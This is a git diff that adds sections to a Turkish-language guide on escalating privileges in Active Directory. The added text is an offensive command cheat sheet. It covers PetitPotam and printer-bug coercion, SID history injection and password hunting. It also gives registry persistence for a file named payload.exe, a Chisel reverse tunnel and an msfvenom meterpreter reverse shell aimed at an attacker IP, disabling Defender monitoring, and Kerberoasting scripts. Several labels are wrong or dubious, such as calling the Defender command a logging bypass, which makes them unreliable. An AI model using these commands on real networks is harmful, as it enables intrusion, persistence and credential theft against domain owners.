@@ -236,3 +236,116 @@ Get-DomainUser -TrustedToAuth
 ## 4. Sonuç
 
 Bu rehber, Active Directory ortamlarında yetki yükseltme sürecinde kullanılabilecek yöntemlerin kapsamlı bir listesini sunar. Her adım dikkatli bir şekilde uygulanmalı ve zafiyetler etkin bir şekilde değerlendirilmelidir.
+
+---
+
+## 5. Ekstra Zafiyetler ve Teknikler
+
+### 5.1. Printer Bug (MS-RPRN) Kullanımı
+**Amaç:** Yazıcı protokolü zafiyetini kullanarak hedef sistemde yetki yükseltme.
+
+```powershell
+Invoke-PrinterBug -Target <target_dc> -Credential <credentials>
+```
+
+### 5.2. PetitPotam Saldırısı
+**Amaç:** Windows işletim sistemlerindeki MS-EFSRPC zafiyetini kullanarak NTLM relay saldırısı gerçekleştirmek.
+
+```bash
+python3 PetitPotam.py -d <domain> -u <user> -p <password> -t <target_dc>
+```
+
+### 5.3. Shadow Attack (ADCS)
+**Amaç:** Active Directory Certificate Services (ADCS) zafiyetlerini kullanarak saldırı.
+
+```powershell
+Get-ADCSCertificateTemplate
+Request-Certificate -Template <template_name>
+```
+
+### 5.4. SID History Manipülasyonu
+**Amaç:** SID history özelliğini kullanarak bir kullanıcıyı domain admin yetkileriyle donatmak.
+
+```powershell
+Set-DomainObject -Identity <object> -Property sidHistory -Value <sid>
+```
+
+---
+
+## 6. Post-Exploitation Adımları
+
+### 6.1. Sensitive Information Discovery
+**Amaç:** Hedef sistemde hassas bilgileri aramak.
+
+#### PowerShell:
+```powershell
+Get-ChildItem -Path C:\ -Recurse -Include *.txt, *.docx, *.xls | Select-String -Pattern "password"
+```
+
+#### Linux:
+```bash
+grep -ri "password" /etc/
+```
+
+### 6.2. Persistence Sağlama
+Yetki yükselttikten sonra ortamda kalıcı hale gelmek için:
+
+#### Registry persistensi:
+```powershell
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware" -Value "C:\payload.exe"
+```
+
+### 6.3. Network Pivoting
+#### Chisel veya Plink kullanarak pivoting:
+```bash
+./chisel server -p 1080 --reverse
+./chisel client <attacker_ip>:1080 R:1080:127.0.0.1:3389
+```
+
+---
+
+## 7. Defensive Evasion Teknikleri
+
+### 7.1. PowerShell Logging'i Bypass Etme
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### 7.2. AV/EDR Tespitini Engelleme
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > payload.exe
+```
+
+---
+
+## 8. Uygulamalı Senaryolar
+
+### Örnek Senaryo: Kerberoasting
+
+1. `GetUserSPNs.py` ile SPN'leri listeleyin.
+2. `hashcat` kullanarak hashleri kırın:
+   ```bash
+   hashcat -m 13100 -a 0 <hash_file> <wordlist>
+   ```
+
+---
+
+## 9. PowerShell ve Bash Scriptleri
+
+### Local Admin Kontrol Scripti (PowerShell):
+```powershell
+$computers = Get-Content computers.txt
+foreach ($computer in $computers) {
+    Invoke-Command -ComputerName $computer -ScriptBlock { net localgroup administrators }
+}
+```
+
+### Kerberos Ticket Dump Scripti (Bash):
+```bash
+#!/bin/bash
+for user in $(cat users.txt); do
+    python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
+done
+```
+
+---
